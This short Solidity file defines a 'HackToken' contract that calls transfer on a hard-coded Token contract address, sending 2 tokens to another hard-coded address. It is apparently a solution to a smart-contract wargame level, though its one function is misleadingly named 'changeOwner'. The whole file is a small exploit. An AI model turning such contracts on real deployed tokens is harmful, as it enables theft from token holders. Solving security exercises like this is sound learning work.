// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Token.sol';

contract HackToken {
    Token public originalContract = Token(0xe86Ba1142f2b4A351B3729854444f79914438657);

    function changeOwner() public {
        originalContract.transfer(0x68fB1897b169446968A7c2128D5025c387d14cC0, 2);
    }
}
